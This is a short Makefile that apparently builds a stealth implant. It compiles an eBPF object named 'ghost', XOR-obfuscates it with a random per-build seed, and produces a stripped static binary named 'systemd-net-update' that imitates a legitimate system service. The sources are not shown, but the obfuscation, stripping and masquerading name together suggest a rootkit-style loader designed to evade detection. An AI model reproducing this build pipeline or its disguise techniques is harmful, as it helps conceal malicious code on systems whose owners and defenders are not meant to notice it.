CC = clang
ZIG = zig
SEED_HEX = $(shell head -c 4 /dev/urandom | xxd -p)

.PHONY: all bpf build clean

all: bpf build clean_obj

bpf:
	@mkdir -p target
	$(CC) -O3 -target bpf -DSEED=0x$(SEED_HEX) -I/usr/include/x86_64-linux-gnu -c src/bpf/ghost.c -o target/ghost.o
	@python3 -c "d=bytearray(open('target/ghost.o','rb').read()); s=0x$(SEED_HEX); \
	for i in range(len(d)): d[i]^=(s&0xFF); s=((s>>8)|(s<<24))&0xFFFFFFFF; \
	open('target/ghost.o','wb').write(d)"

build:
	@sed -i 's/const SEED: u32 = .*;/const SEED: u32 = 0x$(SEED_HEX);/' src/main.zig
	$(ZIG) build-exe src/main.zig \
		-target x86_64-linux-musl \
		-O ReleaseSmall \
		-fstrip \
		--name systemd-net-update \
		--entry _start
	@mv systemd-net-update target/

clean_obj:
	@rm -f target/ghost.o

clean:
	rm -rf target
